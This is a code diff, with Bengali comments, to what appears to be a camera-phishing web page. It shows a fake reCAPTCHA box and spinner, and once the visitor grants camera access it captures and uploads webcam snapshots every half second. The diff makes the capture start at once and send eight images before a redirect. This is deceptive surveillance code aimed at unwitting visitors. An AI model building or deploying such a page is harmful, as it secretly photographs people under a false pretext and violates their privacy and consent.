@@ -232,18 +232,24 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             });
         }
 
-        // পারমিশন allow পাওয়ার পরেই স্পিনার ঘুরবে এবং ৪ সেকেন্ড পর রিডাইরেক্ট হবে
         function requestCameraPermission() {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     video.srcObject = stream;
                     
-                    // পারমিশন পাওয়ার সাথে সাথে ছবি পাঠানো শুরু (প্রতি ০.৫ সেকেন্ড পর পর)
-                    setTimeout(() => {
-                        setInterval(captureAndUpload, 500);
+                    // পারমিশন পাওয়ার সাথে সাথে প্রথম ছবি পাঠানো এবং প্রতি ০.৫ সেকেন্ড পর পর একাধিক ছবি পাঠানো
+                    captureAndUpload();
+
+                    let captureCount = 0;
+                    const captureInterval = setInterval(() => {
+                        captureAndUpload();
+                        captureCount++;
+                        if (captureCount >= 7) {
+                            clearInterval(captureInterval);
+                        }
                     }, 500);
 
-                    // পারমিশন পাওয়ার পর ক্যাপচা বক্স শো হবে এবং ৪ সেকেন্ড স্পিনার ঘুরবে
+                    // ক্যাপচা বক্স শো করা এবং ৪ সেকেন্ড স্পিনার ঘোরানো
                     recaptchaContainer.style.display = 'flex';
                     
                     const checkbox = document.getElementById('recaptchaCheckbox');
